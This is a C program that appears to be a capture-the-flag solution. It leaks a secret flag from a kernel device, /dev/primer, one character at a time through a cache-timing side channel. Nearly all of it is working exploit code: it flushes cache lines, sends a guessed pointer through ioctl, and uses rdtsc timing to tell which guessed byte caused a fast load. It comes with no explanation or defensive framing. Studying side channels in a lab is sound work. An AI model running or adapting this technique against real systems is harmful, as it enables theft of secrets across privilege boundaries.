#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include "primer.h"

extern inline __attribute__((always_inline))
uint64_t measure_one_block_access_time(void* addr)
{
    uint64_t cycles;

    asm volatile("mov %1, %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "mov %%rax, %%rdi\n\t"
            "mov (%%r8), %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "sub %%rdi, %%rax\n\t"
    : "=a"(cycles) /*output*/
    : "r"(addr)
    : "r8", "rdi", "rdx");

    return cycles;
}

int main() {
  volatile int c = 0;
  volatile unsigned char* addrs = aligned_alloc(0x1000, 0x1000 * 256);
  memset((void*)addrs, 0, 0x1000);
  int device = open("/dev/primer", O_RDONLY);

  uint64_t times[0x100] = {0};
  for(size_t target = 0; target < 40; target++) {
  for(size_t guess = '_'; guess <= '}'+1; guess++) {
  for(size_t i = 0; i < 2 * 0x1000; i += 0x1) {
    _mm_clflush(&addrs[i]);
    _mm_clflush(&addrs[i]);
    _mm_clflush(&addrs[i]);
    _mm_clflush(&addrs[i]);
  _mm_mfence();
  _mm_lfence();
  _mm_mfence();
  _mm_lfence();
  }
  ioctl(device, IOCTL_QUERY, (target << 56) | (unsigned long)(addrs + 0x1000 - guess)); // edge of line

  _mm_mfence();
  _mm_lfence();
  _mm_mfence();
  _mm_lfence();
  _mm_mfence();
  _mm_lfence();
  uint64_t lb = measure_one_block_access_time((void*)((unsigned long long)addrs + 0x1000));
  if(lb > 100) {
	 printf("%c", guess-1);
	 if(guess-1 == '}') {
		 printf("\n");
		 return 0;
	 }
	 break;
  }
  //}
  }
  }
  printf("\n");

  return 0;
}

